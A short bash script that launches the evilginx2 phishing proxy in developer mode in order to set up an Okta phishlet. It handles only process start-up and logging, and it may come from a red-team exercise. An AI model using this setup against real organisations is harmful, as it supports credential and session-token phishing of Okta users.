#!/bin/bash
# Start evilginx in developer mode, configure, and set up the Okta phishlet
cd /opt/evilginx2

# Kill any existing evilginx
pkill -f evilginx 2>/dev/null
sleep 1

# Start evilginx in background with developer mode
./evilginx -developer -p ./phishlets -c ./config > /tmp/evilginx.log 2>&1 &
EVILPID=$!
echo "[*] evilginx started with PID $EVILPID"
sleep 3

# Check if it started
if ! kill -0 $EVILPID 2>/dev/null; then
    echo "[-] evilginx failed to start. Log:"
    cat /tmp/evilginx.log
    exit 1
fi

echo "[+] evilginx running. Check /tmp/evilginx.log for output."
echo "[*] Now configure via the evilginx console."
